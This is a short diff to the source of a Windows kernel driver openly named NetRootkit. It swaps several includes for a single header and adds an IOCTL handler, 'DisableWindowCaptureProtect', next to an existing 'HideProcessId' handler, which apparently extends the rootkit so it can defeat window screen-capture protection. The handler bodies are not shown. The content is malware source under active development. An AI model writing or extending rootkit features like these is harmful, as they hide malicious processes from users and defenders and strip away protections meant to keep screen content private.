@@ -1,8 +1,4 @@
-#include <Ntifs.h>
-#include "Public.h"
-#include <Ntstrsafe.h>
-#include "IoctlHandlers.h"
-#include "NetworkHook.h"
+#include "Driver.h"
 
 void NetRootkitUnload(_In_ PDRIVER_OBJECT DriverObject);
 NTSTATUS NetRootkitCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp);
@@ -119,6 +115,11 @@ NTSTATUS NetRootkitDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 	case RookitIoctls::HideProcessId:
 
 		status = IoctlHandlers::HandleHidePID(Irp, IrpStack->Parameters.DeviceIoControl.InputBufferLength);
+		break;
+
+	case RookitIoctls::DisableWindowCaptureProtect:
+
+		status = IoctlHandlers::DisableWindowCaptureProtect(Irp, IrpStack->Parameters.DeviceIoControl.InputBufferLength);
 		break;
 
 	default:
